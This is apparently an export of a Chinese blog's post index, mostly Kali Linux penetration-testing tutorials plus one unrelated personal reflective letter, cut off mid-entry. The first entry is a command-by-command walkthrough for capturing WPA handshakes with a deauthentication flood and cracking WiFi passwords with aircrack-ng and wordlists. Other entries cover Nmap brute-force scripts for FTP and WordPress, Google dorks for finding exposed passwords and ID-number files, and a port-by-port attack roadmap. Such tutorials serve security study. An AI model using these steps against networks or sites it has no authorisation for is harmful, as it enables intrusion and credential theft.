暴力破解WiFi密码","content":"前期准备硬件设备：\n\n\n\n\n\n\n\n\n\n操作机器无线渗透网卡 | 有线渗透网卡\n软件：\n\n\n\n\n\n\n\n\n\nKali Linux 系统 （我版本是 2021.1）Aircrack-NG爆破字典 （可以是 Kali Linux 自带的）有 wifi 环境下\n\n实现代码首先我们要建立监听热点环境机制\n# 检查网卡是否连接成功,成功会看到 wlan0 出现\nifconfig -a\n\n#  kill 一切干扰无线网卡监听热点的信号\nairmon-ngcheck kill\n\n# wlan0是无线网卡的名称,载入网卡开启网络监听\nairmon-ng start wlan0\n\n# 此时无线网卡的名称将变成 wlan0mon ,表示开启网络监听\nifconfig -a\n\n# 该操作是开始监听周围WiFi热点, 显示各个WiFi热点（ctrl C停止监听）\nairodump-ng wlan0mon\n\n# 选取WiFi热点进行攻击, 该操作是抓包,当新建一个终端去攻击连接WiFi的设备掉线后，我们抓到的tcp包就是存储在&#x2F;root&#x2F;桌面这个路径上\nairodump-ng -c 频道(ch) --bssid bssid -w &#x2F;root&#x2F;桌面 (用来存储抓包的目录) 网卡名\n\n# 新建一个终端：键入下面代码\naireplay-ng -0 0 -c 客户端MAX(STATION) -a bssid 网卡名 (一般为wlan0mon)\n\n# 此时返回前一个终端,可看到抓到的tcp包,在头部位置\nWPA handshake :  bssid \n\n# 暴力破解, 解压kali自带的字典文件  路径：&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt.gz\ngzip -d&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt.gz\n\n# 开始爆破 aircrack-ng -w 字典路径（kali有自带的字典文件，解压路径为:&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt） &#x2F;root&#x2F;桌面&#x2F;桌面-01.cap（握手包）\naircrack-ng -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt &#x2F;root&#x2F;桌面-0.1.cap\naircrack-ng -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -b 88:C3:97:31:E8:9D test-01.cap\naircrack-ng -w &lt;指定字典&gt; -b &lt;目的路由MAC地址&gt; &lt;抓到的握手包&gt;\n\n# 关闭网络监听\nairmon-ng stop wlan0mon\n# 使用 crunch \ncrunch\n\n# 10 10表示制作一个10位数的密码， 012表示密码中包含数字012xy这些元素，&#x2F;root&#x2F;12345.txt表示密码文本储存的路径以及名字\ncrunch 10 10 012 xy&gt;&gt;&#x2F;root&#x2F;12345.txt\n\n# 使用aircrack-ng -w &#x2F;root&#x2F;12345.txt &#x2F;root&#x2F;cap&#x2F;er8-01.cap（ircrack-ng -w 字典路径 握手包路径） 进行wifi密码破解\n\n原理流程介绍airepaly-ng -0 0 -c 客户端MAX(STATION) -a bssid 网卡名 (一般为wlan0mon) 代码解释:\n\n\n\n\n\n\n\n\n\n0为用deauth洪水攻击WiFi设备的次数，0为无限，-0 5则攻击5次。攻击原理是：先让设备掉线，设备会再自动连接，并发这个自动连接过程会进行三次握手，会发送tcp包（里面包含加密的密码数据），我方伪装成WiFi热点去窃取该数据包。我方窃取后即可用字典穷举法暴力破解加密的WiFi密码为什么要穷举，而不是直接从数据包里面获取密码？因为数据包里面的密码是哈希加密的，哈希加密只能正向，不能反向推导，所以需要一个个正向推导，直到找到正确的密码。\n\n\n\n\n\n\n\n\n\n暴力破解就是穷举法，将密码字典中每一个密码依次去与握手包中的密码进行匹配，直到匹配成功。能否成功破解wifi密码取决于密码字典本身是否包含了这个密码。破解的时间取决于CPU的运算速度以及wifi密码本身的复杂程度。如果WiFi密码设得足够复杂，即使有一个好的密码字典，破解成功也可能要数小时甚至数天。\n暴力破解思路:\n\n\n\n\n\n\n\n\n\nkali系统接入无线网卡，并通过里面的aircrack程序开始监听周围热点，选择一个WiFi热点，用aircrack去攻击一台连接了该WiFi热点的设备，使其掉线，之后这台设备（手机&#x2F;电脑）肯定会再次自动来连接，我方利用伪装的挂载设备去接受设备（电脑&#x2F;手机）发送的tcp三次握手数据包(里面包含了加密的WiFi密码)。此时我们只要用kali里面自带的密码字典文件去穷举该数据包，直到找到WiFi密码为止就成功了。\n","slug":"kaliLinux_bursting-wifi","date":"2021-09-27T16:12:50.000Z","categories_index":"程序","tags_index":"教学文档,Kali Linux","author_index":"Arvin"},{"id":"8a136bd4bc90eea75620db6f9faecfe8","title":"Kali-Linux 子域名 Sublist3r","content":"Kali Linux 子域名 Sublist3r\n\n\n\n\n\n\n\n\n注意本资料只适用学习研究，禁止进行非授权活动。请熟读网络安全法条规\nLali Linux 系列第四篇信息收集第三章 子域名 Sublist3r\n\n\n\n\n\n\n\n\n\n从几个维度来收集子域名，使用软件进行目录扫描\n子域名收集的作用\n\n\n\n\n\n\n\n\n\n扩大渗透测试范围\n找到目标站点突破口\n业务边界安全\n\n当然泛解析域名是没有利用价值的\n常见子域盲区\n\n\n\n\n\n\n\n\n\n子域名打开就是404页面、403页面怎么做\n案例：我们如何发现 ucweb.com 的两个 XSS\n示例：链接\n收集子域名的方法\n在线收集子域名\n\n\n\n\n\n\n\n\n\n\n\n谷歌语法\n\n通过特定站点的范围查询子域：site：baidu.com\n\n在线爆破\n\n在线枚举爆破：在线枚举爆破链接\n\n证书搜索\n\n基于 SSL 证书查询子域：基于 SSL 证书查询链接\n\nDNS 搜索（比较精准）\n\n基于 DNS 记录查询子域：基于 DNS 记录查询子域链接\n\nFuzzdomain 工具\n\n\n\n\n\n\n\n\n\n\n使用 GitHub 下载相应的子域发现工具（根据文档记得安装依赖）\ngit clone https:&#x2F;&#x2F;github.com&#x2F;aboul3la&#x2F;Sublist3r\n\n# 安装模块（当然它还有一些 DNS 的工具包，可以在说明文档看）\nsudo pip3 install -r requirements.txt\n\n# 枚举目标子域\npython sublist3r.py -d aqlab.cn\n\n# 枚举子域并且显示开发 80 和 443 端口的子域\npython sublist3r.py -d aqlab.cn -p 80,443\n\n# 枚举目标子域并保存\npython shublist3r.py -d aqlab.cn -o aqlab.txt\n\n\n用户事件\n\n\n\n\n\n\n\n\n\n\n\n历史漏洞\n\n乌云镜像：乌云镜像链接\n\n使用手册、通知\n\n学院通知：示例链接\n\n使用御剑扫描敏感目录\n\n\n\n\n\n\n\n\n御剑是一款很好用的网站后台扫描工具，图形化页面，使用起来简单上手\n下载：字典链接下载：御剑系列链接提取码：YJXZ\n字典查询\n\n\n\n\n\n\n\n\n\n弱口令100\nWeb目录字典  - 域名字典\nrobots.txt 文件的作用\n\n\n\n\n\n\n\n\nRobits协议\n（也叫爬虫协议、机器人协议等）全称是 “ 网络爬虫排除标准 ” （Robots Exclusion Protocol）,网站通过 Robots 协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。\n\n\n\n\n\n\n\n\n\nRobots.txt 文件的重要性\nRobots.txt 是搜索引擎蜘蛛访问网站时要查看的第一个文件，并且会根据 Robots.txt 文件的内容来爬行网站。在某种意义上说，它的一个任务就是指导蜘蛛爬行，减少搜索引擎蜘蛛的工作量。\n\n\n\n\n\n\n\n\n\nRobots.txt 文件的存放位置\n网站根目录下，通过 “ 域名&#x2F;robots.txt0 ” 能正常访问即可，如：http:&#x2F;&#x2F;域名&#x2F;robots.txt\nRobots写法：链接\n","slug":"kaliLinux-Subdomain-Sublist3r","date":"2021-09-25T06:56:50.000Z","categories_index":"程序","tags_index":"教学文档,Kali Linux","author_index":"Arvin"},{"id":"59a62c39ccd545e1bf6ef203099e6cc2","title":"【無憂樹洞】那些片段里的心绪与渴望","content":"紫霞说，她在等她的齐天大圣，踩着七彩祥云，从天而降。\n我有一个片段，某个人，从天而降，有没有七彩祥云不重要，重要的是，他的眼里有我，望着我，目光温柔而笃定，然后冲我勾勾手指，笃定的吐出三个字“跟我走”，没有勉强，也不容抗拒。哈哈。。。曾经我有一个心理咨询师，在跟他简短的聊了几句之后，我就决定找他做咨询了，他的声音里藏着这样的气质“跟我走”，适合我这样的没有方向的人，哈哈。\n后来的后来，我一直在想，我该自己找到自己的方向，即便没有方向，也需要自己上路。\n突然想起一个记忆的片段，我已经忘记了那个男人的名字，样貌，但是我记得，他牵着我的手，走在我的前面，提着我的行李，带我穿过拥挤的人群。一个属羊的温柔的男人，那个瞬间，我是喜欢他的。\n我时常“看见”这样一个画面，在一片绿油油的草地上，一个蹒跚走路的小女孩，顾自在玩儿，那是她对世界的一种探索吧，也许偶然之间，她发现了一片特别的叶子，一块可爱的石头，然后她拿着自己的胜利品，回头，望向她的爸爸，爸爸宠溺的看着他，目光温柔，满眼都是赞许和鼓励，在这样的眼神和笑容里，小姑娘满足的顾自继续玩耍。\n类似的情景，现在时常发现在我和儿子的场景中，他会跟我炫耀他的游戏成果，他的作品，有时候会希望我看他打游戏。在小孩子的世界中，他自己是很厉害的。\n只是我发现，这对我来说，也是困难的。我们要从一个我们从未习得的部分，去习得爱与温柔，坚定与力量。\n曾经我遇到过一个人类图的解读师，我是只有1%人群的反映者，是很好的管道特质，她带我去认识了她背后的“组织”，我在某个场域中，深深的感受到一种更宏大的力量，有一种眼泪是饱含故乡、回家。 不过他们的领导人表示，我和他们不是一路人。\n我们总是会有机缘，遇见各种各样的人，圈子，人的社会化属性，对于同类总是会有深深的渴望。\n也许意识上，已经知晓天人本一，也已经知晓我们本无任何差别，宇宙与我们，不过是人体与头发丝的关系，每一根头发丝都携带着人体全部的DNA信息。所有的不同的人，仿佛都来自同一个父母的基因，我们都是近亲。我们也深刻的知晓，我们都是有“父母”生养的人，但是我依然会有一种从未见过“父母”的样貌的孤儿的感觉。在这虚空之中，有时候我们可以感受到那种全然的爱，来自“父母”这宇宙之爱。\n我总是“看见”各种战争的画面，遍地残骸，尸横遍野，有一些战争在人类的战场，有一些战争并不在地球之上。\n总有一个虚空的存在，如同宇宙的深处，无穷尽的黑暗，无穷尽的空间，只是在那样的空间飘荡，全然的放松与存在，我享受那样纯粹的存在。那样的感觉一点也不恐怖，而是熟悉的安心的，仿佛我们就来自这样的虚空，又归于这样的虚无。\n男人在性爱之中，总是想要去征服，进入女人的身体，仿佛就是一种征服，在意识被生理接管的时候，头脑和内心被征服的胜利的满足感，成就感充斥。在意识模糊的时候，总有一些言语，会直接通往潜意识的深处。每个人，不同。有些人，需要胜利，需要征服；有些人需要爱；有些人需要某些特殊的关系；有些人需要其他。你需要什么？\n我时常陷入“要我”的迷思，我时常被“我要你”俘虏。这种要和被要，通向潜意识的什么意图？我一直知道，那里还有一座未探索的迷宫。\n你有什么理想？\n有人告诉我，有一份安稳的工作，有不错的收入，结婚，生孩子，然后就像王子和公主一样过着幸福的生活。\n为你的理想干杯，致敬你的理想。理想没有什么好不好，高尚不高尚，只要它会成为某种方向，在召唤你，在让你为之而努力，就很好。\n我很仔细的想了想，我的理想是什么。我以前很喜欢看超女，看最强大脑，我觉得他们有理想，有追求。我没有那种东西。\n我想了想，我唯一可以称之为理想的念头，种子，大概就是，我本来想说普度众生，哈哈，可是没有什么人是需要度的呀，我们唯一需要度的只有自己，所有的人都是来度我们自己的。所以我的理想，大概就只是度我自己吧。可是我的理想，并没有为我带来方向和动力，所以我想，我的理想，还不足以称为理想吧，大概只是一颗还没有种下去的种子，还没有发芽。\n这是一个值得探索和研究的问题，我已经探索了很久很久。\n曾经我以为，我应该要找到某个地方，然后去远行。走了很久很久之后，才知道，我们要找的东西，根本不在一个叫远方的地方，也没有什么别的东西需要去寻找，也没有什么别的东西，需要去求索。如果本自具足，我们就根本不缺什么，也没有什么需要寻找和求索的。\n难道，我们缺的就只是信任？全然的相信？\n应该不是的。\n我们像积满了厚厚的灰尘的钻石，使它看起来一点都不像钻石。我们除了相信它原本就是钻石，还需要一点点把那些灰尘拭去，然后某天终于会印证这本就是钻石吗。\n\n我只是在呢喃自语，\n如果你看了，就已经是一种见证和陪伴了，\n因为我知道一定会有人看。\n如果有什么信息能和你共鸣，\n你从中看见了自己，\n那就是另外的收获了。\n如果你看懂了，\n你从中看见了我，\n还能有什么回应，\n并且这回应我们还可以彼此共振，\n那就是更大的惊喜了。\n没有无缘无故的遇见。\n致敬未知。\n","slug":"epistle.2021.9.22.01","date":"2021-09-22T13:29:56.000Z","categories_index":"书信","tags_index":"小柔书信","author_index":"Arvin"},{"id":"c2176142dd8ec1c020fbde2b846e998a","title":"Kali-Linux 攻击路线图","content":"Kali Linux 攻击路线图\n\n\n\n\n\n\n\n\n注意本资料只适用学习研究，禁止进行非授权活动。请熟读网络安全法条规\nWeb 应用服务\n\n\n端口号\n端口说明\n攻击方向\n\n\n\n80 &#x2F; 443 &#x2F; 8080\n常见 Web 服务端口\nWeb 攻击、爆破、对应服务器版本漏洞\n\n\n7001 &#x2F; 7002\nWeblogic 控制台\nJava 反序列化 、弱口令\n\n\n8080 &#x2F; 8089\nJboss &#x2F; Resin?Jetty &#x2F; Jenkins\n反序列化、控制台弱口令\n\n\n9090\nWebShphere 控制台\nJava反序列化、弱口令\n\n\n4848\nGlassFish 控制台\n弱口令\n\n\n1352\nLotus domino 邮件服务\n弱口令、信息泄露、爆破\n\n\n10000\nWebmin-Web 控制面板\n弱口令\n\n\n远程连接\n\n\n端口号\n端口说明\n攻击方向\n\n\n\n22\nSSH 远程连接\n爆破、SSH 隧道及内网代理转发、文件传输\n\n\n23\nTeinet 远程连接\n爆破、嗅探、弱口令\n\n\n3389\nRdp 远程桌面连接\nShift 后门（Win server 2003 以下系统）、爆破\n\n\n5900\nVNC\n弱口令爆破\n\n\n5632\nPyAnywhere 服务\n抓密码、代码执行\n\n\n文件共享\n\n\n端口号\n端口说明\n攻击方向\n\n\n\n21 &#x2F; 22 &#x2F; 69\nFtp&#x2F;TFtp 文件传输协议\n匿名上传、下载、爆破和嗅探\n\n\n2049\nNFS 服务\n配置不当\n\n\n139\nSamba 服务\n爆破、未授权访问、远程代码执行\n\n\n389\nLdap 目录访问协议\n注入允许、匿名访问、弱口令\n\n\n数据库服务\n\n\n端口号\n端口说明\n攻击方向\n\n\n\n3306\nMySQL\n注入、提权、爆破\n\n\n1433\nMsSQL 数据库\n注入、提权、SA 弱口令、爆破\n\n\n1521\nOracle 数据库\nTNS 爆破、注入、反弹 Shell\n\n\n5432\nPostgreSQL\n爆破、注入、弱口令\n\n\n27017 &#x2F; 27018\nMongoDB\n爆破、未授权访问\n\n\n6379\nRedis 数据库\n可尝试未授权访问、弱口令、爆破\n\n\n5000\nSysBase &#x2F; DB2 数据库\n爆破、注入\n\n\n邮件服务\n\n\n端口号\n端口说明\n攻击方向\n\n\n\n25\nSMTP 邮件服务\n邮件伪造\n\n\n110\nPOP3 协议\n爆破、嗅探\n\n\n143\nIMAP 协议\n爆破\n\n\n网络常见协议\n\n\n端口号\n端口说明\n攻击方向\n\n\n\n53\nDNS 域名系统\n允许区域传送、DNS 劫持、缓存投毒、欺骗\n\n\n67 &#x2F; 68\nDHCP 服务\n劫持、欺骗\n\n\n161\nSNMP 协议\n爆破、搜集目标内网信息\n\n\n特殊服务端口\n\n\n端口\n端口说明\n攻击方向\n\n\n\n2181\nZookeeper 服务\n未授权访问\n\n\n8069\nZabbix 服务\n远程执行、SQL 注入\n\n\n9200 &#x2F; 9300\nElastcsearch 服务\n远程执行\n\n\n11211\nMemcache 服务\n未授权访问\n\n\n512 &#x2F; 513 &#x2F; 514\nLinux Rexec 服务\n爆破、Rlogin 登陆\n\n\n873\nRsync 服务\n匿名访问、文件上传\n\n\n6390\nSvn 服务\nSvn 泄露、未授权访问\n\n\n50000\nSAPManagement Console\n远程代码执行\n\n\n","slug":"kali-LinuxAttacks01","date":"2021-09-20T19:53:50.000Z","categories_index":"网安知识","tags_index":"教学文档,Kali Linux,信息收集","author_index":"Arvin"},{"id":"51f7b2c99cf50041b94f97f205ad5e98","title":"Kali-Linux Nmap 端口扫描","content":"Kali Linux Nmap - 端口扫描\n\n\n\n\n\n\n\n\n注意本资料只适用学习研究，禁止进行非授权活动。请熟读网络安全法条规\nLali Linux 系列第四篇信息收集第二章 Nmap 端口扫描\nNmap 简介\n\n\n\n\n\n\n\n\n\nNmap （” Network Mapper（网络映射器）”）是一款开放源代码的网络探测和安全审核的工具。它的设计目标是快速地扫描大型网络，当然用它扫描单个主机也没有问题。Nmap 以新颖的方式使用原始IP报文来发现网络上有哪些主机，那些主机提供什么服务（应用程序名和版本），那些服务运行在什么操作系统（包括版本信息），它们使用什么类型的报文过滤器 | 防火墙，以及一堆其他功能。虽然 Nmap 通常用于安全审核，许多系统管理员和网络管理员也用它来做一些日常的工作，比如查看整个网络的信息，管理服务升级计划，以及监视主机和服务的运行。\nNmap 官网：网址\n\nNmap 的作用\n\n\n\n\n\n\n\n\n\n检测存活在网络上的主机（主机发现）\n检测主机上开放的端口（端口发现或枚举）\n检测到相应的端口（服务发现）的软件和版本\n检测操作系统，硬件地址，以及软件版本\n检测脆弱性的漏洞（Nmap 的脚本）\n\n\nNmap 常用扫描指令常用的端口扫描指令：\n\n\n\n\n\n\n\n\n\n-sS：TCP SYN扫描\n-sU：UDP扫描\n-sT：TCP扫描\n-sV：扫描系统版本和程序版本号检测\n-sn：只进行主机发现，使用ping扫描来侦测存活主机不进行端口扫描\n-sV：扫描版本号侦测，检测开放端口来判断开放服务，并检测其版本\n-sR：RCP扫描 扫描是否为 PRC 端口，存在 PRC 端口则返回程序和版本号\n-sP：Ping 扫描\n-P0；-Pn：无 Ping 扫描\n-PS：TCP SYN Ping 扫描\n-PA：TCP ACK Ping扫描\n-PU：UDP Ping 扫描\n-PE；-PP；-PM：ICMP Ping Types扫描\n-PR：ARP Ping 扫描\n-p：指定端口号扫描\n-PR：ARP ping 扫描 通常在局域网扫描，使用地址解析协议，本地局域网不会禁止 ARP 请求\n-sL：列表扫描，列出指定网络上的每台主机，默认使用域名解析获取他们的名字\n-v：显示扫描过程\n-w：结果的详细输出\n-F：快速扫描\n-n：禁止反向域名解析\n-R：反向域名解析\n-6：启动 IPV6 扫描\n-o：启动系统探测\n-Pn：禁止ping后扫描：跳过主机发现的过程进行端口扫描\n-A：全面的系统扫描：包括打开操作系统探测、版本探测、脚本扫描、路径扫描\n–scrpt&#x3D;vuln：全面的漏洞扫描\n–allports：全端口版本探测 启用全端口版本扫描，会跳过9100 TCP 段 只有使用 –allports 才能扫描所有的端口\n–version-intensity：扫描强度设置 扫描强度为 0-9 ，默认为7，最低为0，最高为9\n-system-dns：系统域名解析器，通过直接发送查询到主机上自带配置的域名服务器来解析域名\n-traceroute：路由跟踪，帮助用户了解网络情况，可以查出本地计算机到目标之间所经过的网络节点，并可以看到通过各个节点的时间\n-PY：SCTP INIT Ping扫描 通过 STCP 协议进行扫描主机\n–version-trace：获取详细版本信息 对获取目标主机的额外信息有帮助\n–osscan-guess；–fuzzy：探测系统识别 当 nmap 无法准确识别系统时，我们可以用这两个参数进行大胆的尝试猜测系统\n扫描指定IP开放端口：\n\n\n\n\n\n\n\n\n\nnmap -sS -p &lt;端口号&gt; -v 192.168.1.2\n使用半开扫描，指定端口号1-65535，显示扫描过程\n穿透防火墙扫描：\n\n\n\n\n\n\n\n\n\nnmap -Pn -A 192.168.1.2\n服务器禁止ping命令，试一试 -Pn，nmap参数配合使用\n保存结果到文件：\n\n\n\n\n\n\n\n\n\n-Og &lt;文件名&gt;\n漏洞扫描：\n\n\n\n\n\n\n\n\n\nnmap -script&#x3D;vuln 192.168.1.2\n使用 vuln 脚本进行全面的漏洞扫描\n指纹识别扫描：\n\n\n\n\n\n\n\n\n\nnmap -sV -v 192.168.1.2\n扫描系统和程序版本号检测，并输出详细信息\n\n\n\n\n\n\n\n\n\n在 Root 用户下，直接使用 nmap 目标 启用了 -sS 扫描模式\nnmap -p 80-81 192.168.1.2 选择范围扫描\nnmap -p 80-81 -Pn 192.168.1.2 穿透防火墙扫描\nnmap -p 80-81 -Pn -v 192.168.1.2 显示扫描全过程 \nnmap -A -Pn  192.168.1.2 全局扫描\nNmap 扫描状态\n\n\n\n\n\n\n\n\nOpend：端口开启\nClosed：端口关闭\nFiltered：端口被过滤，数据没有到达主机，返回结果为空，数据被防火墙\nUnfiltered：未被过滤，数据有到达主机，但是不能识别端口的当前状态\nOpen | filtered：开放或者被过滤，端口没有返回值，主要发生在UDP、IP、FIN、NULL 和 Xmas 扫描中\nClosed | filtered：关闭或者被过滤，只发生在IP ID idle 扫描\nCVE:\n\n\n\n\n\n\n\n\n\nhttp://cve.scap.org.cn/\nhttp://cve.mitre.org/\n信息安全漏洞查询库：我们可以将检测的漏洞编号收集在这里去验证\nNmap 漏洞扫描信息收集\n\n\n\n\n\n\n\n\n使用 Nmap 中的脚本进行信息收集\nwhois 信息收集\n\n\n\n\n\n\n\n\n\n脚本名称：whois-domain.nse\n使用方法：nmap –script whois-domain.nse &lt;目标&gt;\n查询目标 whois 信息\nDNS 解析查询\n\n\n\n\n\n\n\n\n\n脚本名称：dns-brute\n使用方法：nmap –script dns-brute &lt;目标&gt;\n通过 DNS 记录进行查询并且进行爆破\n扫描 WEB 漏洞\n\n\n\n\n\n\n\n\n\n脚本名称：http:stored-xss.nse\n使用方法：nmap –script http:stored-xss.nse &lt;目标&gt;\n扫描目标是否存在 xss 漏洞\n还有很多 web 扫描脚本\n检测 MySQL 密码\n\n\n\n\n\n\n\n\n\n 脚本名称：mysql-empty-password\n使用方法：nmap –scirpt&#x3D;mysql-empty-password &lt;目标&gt;\n检测目标是否存在空口令或者密码为Root\nFTP 服务认证\n\n\n\n\n\n\n\n\n\n脚本名称：ftp-brute\n使用方法：nmap –script ftp-brute -p 21 &lt;目标&gt;\n爆破目标是否存在弱口令\n使用字典：nmap –script ftp-burute –script-args user&#x3D;user.txt,passdword&#x3D;passdword.txt &lt;目标&gt;\nwordpress认证\n\n\n\n\n\n\n\n\n\n脚本名称：http-wordpress-brute\n使用方法：nmap –script http-wordpress-brute\n使用字典：nmap –script http-wordpress-brute –script-args user&#x3D;user.txt,passdword&#x3D;passdword.txt &lt;目标&gt;\nNmap 指定脚本扫描：\n\n\n\n\n\n\n\n\n\nnmap –script&#x3D;&lt;指定脚本名&gt; &lt;域名&gt;\nnmap –script&#x3D;smb-vuln-ms17-010 &lt;域名&gt;\nNmap报告输出一 . 标准保存\n\n\n\n\n\n\n\n\nnmap -oN &lt;文件&gt;.txt &lt;目标域名&gt;\n标准保存会把输出结果保存到指定文件\n二 . 保存为 XML 格式\n\n\n\n\n\n\n\n\nnmap -oX &lt;文件&gt;.xml &lt;目标域名&gt;\n保存为 XML 格式需要用浏览器打开，查看结果\n社工密码字典在线生成：字典链接\n","slug":"kali-LinuxPortScanning-Nmap","date":"2021-09-20T19:49:50.000Z","categories_index":"网安知识","tags_index":"教学文档,Kali Linux,信息收集","author_index":"Arvin"},{"id":"d2315e522b70ebb548b40f7b13edcaaf","title":"Kali-Linux 搜索引擎 & Google 语法","content":"Kali Linux 信息收集第一章 搜索引擎 &amp; Google 语法\n\n\n\n\n\n\n\n\n注意本资料只适用学习研究，禁止进行非授权活动。请熟读网络安全法条规\nLali Linux 系列第四篇信息收集第一章 搜索引擎 &amp; Google 语法\n\n\n\n\n\n\n\n\n\n从零开始的信息收集 | 渗透测试的本质就是信息收集也是信息收集的一个过程，以及在过程中我们会使用到的一些技术\n信息收集的作用\n\n\n\n\n\n\n\n\n信息零碎化，收集的工整性（扩大渗透思路）\n最了解你的人，往往都是你的对手。知己知彼、百战不殆\n收集哪些信息针对 WEB 渗透测试我们需要一下信息\n\n\n\n\n\n\n\n\n\n\n网站的架构\n前端\n后端\n关于网站的一切信息等\n\n信息收集的重要性\n\n\n\n\n\n\n\n\n知己知彼，百战不殆\n观察、无从下手\n开门有锁 | 需要钥匙\n买U盘的性价比\n\n亏 | 存在信息差\n赚 | 信息充分利用（优惠价 | 有性价比）\n\n打错人 | 因为错误信息\n不相关事件 | 蝴蝶效应（学会信息存库）\n为什么要进行信息收集\n\n\n\n\n\n\n\n\n获取信息\n了解对方\n掌握情况\n寻找弱点\n安全短板\n信息收集的内容\n\n\n\n\n\n\n\n\n对于 Web 渗透测试而言，针对目标系统所相关的信息\n\n\n\n框架\n开发人员\n安全人员\n\n\n\n前端\nHTML | CSS | JS ···\n指纹识别 | GITHUB&#x2F;源代码泄露 | 敏感文件及地址\n\n\n后端\nPHP | ASP .NET | 容器 | 数据库···\n框架识别 | 容器识别\n\n\n中间件\n就是中间件\n组件报错\n\n\n系统\nWindows Server | Linux | mac Server\n端口 | 系统识别\n\n\n网络架构\nOSI 模型\n域名 | Whois | CDN | C段\n\n\n\n传统搜索引擎\n\n\n\n\n\n\n\n\n主流搜索引擎分为：百度、Google、360、必应。他们的区别在于收录的结果多少不同。\n传统搜索引擎作用\n\n\n\n\n\n\n\n\n传统的搜索引擎能够有效的抓取对方网站页面内容信息\n传统搜索引擎针对网页内容以及网页标题等相关信息进行抓取，提供给我们进行查阅\n可能包含数据\n\n\n\n\n\n\n\n\n\n\n公司动态\n组织文档\n用户名 | 密码\n测试文件\n历史文件\n\n\nGoogle hack 语法\n\n\n\n\n\n\n\n\n常见的 Google 语法，帮助我们快速缩小目标搜索范围\n语法介绍：\n\n\n\n\n\n\n\n\n\nsite：搜索范围限制在某个网站或顶级域名中\ninurl：当我们用 inurl 进行查询的时候，Google 会返回那些在 URL（网址）里面包含了我们查询关键字的网页\nintext：当我们用 intext 进行查询的时候，Google 会返回那些在文本正文里包含了我们查询关键字的网页\nintitle：当我们用 intitle 进行查询的时候，Google 会返回那些在网页标题为查询结果\n···\nGoogle 语法例子\n\n\n\n\n\n\n\n\n\nintitle : “netbotz app I i ance” “ok”   — 搜索标题\ninurl : &#x2F;admin&#x2F;login.php   — 搜索地址\ninurl : qq.txt  — 搜索文件 \nfiletype : xls “username | password” — 搜索文件类型\nintext : password “Login Info” filetyoe : txt — 搜索文件\nfiletype:xls”身份证” — 搜索文件类型\n扩展思路：扩展（Google 白帽漏洞数据库）\nGoogle 镜像\n\n\n\n\n\n\n\n\n\nhttps://www.ggjxz.top/\nhttps://gg456.top/\nhttps://tools.bugscaner.com/google/\n\n网络空间引擎\n\n\n\n\n\n\n\n\n基于物联网搜索，搜索联网的网络设备（如打印机、摄像头、智能家居）\n扫描在线的暴露的网络设备：路由器、主机、智能电视、联网设备\n网络空间搜索引擎\n\n\n\n\n\n\n\n\n\n\n钟馗之眼：http://www.zoomeye.org\nShodan：https://www.shodan.io\nfofa：https://fofa.so/\n傻蛋：https://www.oshadan.com/\nDnsdb 搜索：https://www,dnsdb.io/zh-cn/\n\n\n精细化搜索\n\n\n\n\n\n\n\n\n微信公众号：https://weixin.sogou.com/\n知乎相关：https://www.zhihu.com/search?q=\n微博相关：http://s.weibo.com/?Refer=\n购物：https://search.jd.com/Search?enc=utf-8&amp;keyword\ngithub：https://github.com/search?q=\n贴吧：http://tieba.baidu.com/f/search/res?qw=\n\n\n\n\n\n\n\n\n\n例如：\nsite:tieba.baidu.com “qq号”\nweixin.sougou.com  — 搜狗微信文章，文章有试用的账户密码等\n\n撰写信息收集报告整理信息的方式有很多种，我们的最终目标是整理我们收集到的信息进行分析\n\n\n\n\n\n\n\n\n\n一 . 信息收集-环境\n域名：\n脚本语言：数据库：\n中间件：\n服务器系统：\nWAF：无\nCMS 或 框架：\n真实 IP：\n开放的敏感端口：\n历史解析 IP：\n注册邮箱：\nWhois：\n安全措施（如：自定义404、伪静态处理、流量防护等）.. 404\n子域名：（如：自定义404、伪静态处理、流量防护等）\n旁站：\n目录信息：\n····\n二 . 信息收集 - 网络架构\n\n搜索引擎收集目标信息（site + 找后台语法）\n外围式信息收集，不经过目标。可避免各种环境因素干扰。应当首选。\n 1.1 百度\n​\t结果：无可利用\n  1.2 Google\n​\t结果：无可利用\n  1.3 必应\n​    结果：无可利用\n  1.4 sougou\n   结果：无可利用\n  1.5 360 搜索\n   结果：无可利用\n\n目标爬行\n爬行相对于暴力扫描来说动静小很多、且对于目标的收集效率高\n注：可使用 Burp suite、Awvs\n结果：\n\n暴力猜解\n 3.1 基于字典的扫描。\n注：可疑目录继续进行子目标扫描..\n结果：\n\n\n三 . 弱点探测\n\n平台漏扫（+蜘蛛 UA）\nRobots.txt\n\n\n\n\n\n\n\n\n\n\n\n域名：xxx\n子域名：xxx\n​\t\t\t  xxx\n脚本语言：xxx\n···\n还可以通过表格,找到适合自己的信息整理方式。我个人喜欢表格\n\n扩展：\n\n\n\n\n\n\n\n\n\n相应工具有相应的功能\n\n通过端口扫描搜索数据库信息、端口信息\n域名可以查IP、查旁站、查后台\n\n","slug":"kali-LinuxICSearchEngine_Google","date":"2021-09-17T16:34:50.000Z","categories_index":"网安知识","tags_index":"教学文档,Kali Linux,信息收集","author_index":"Arvin"},{"id":"af939f413ea192c0fc66fd0c03fa499a","title":"Kali-Linux 渗透测试流程以及信息收集","content":"Kali Linux 渗透测试流程以及信息收集\n\n\n\n\n\n\n\n\n注意本资料只适用学习研究，禁止进行非授权活动。请熟读网络安全法条规\nLali Linux 系列第四篇 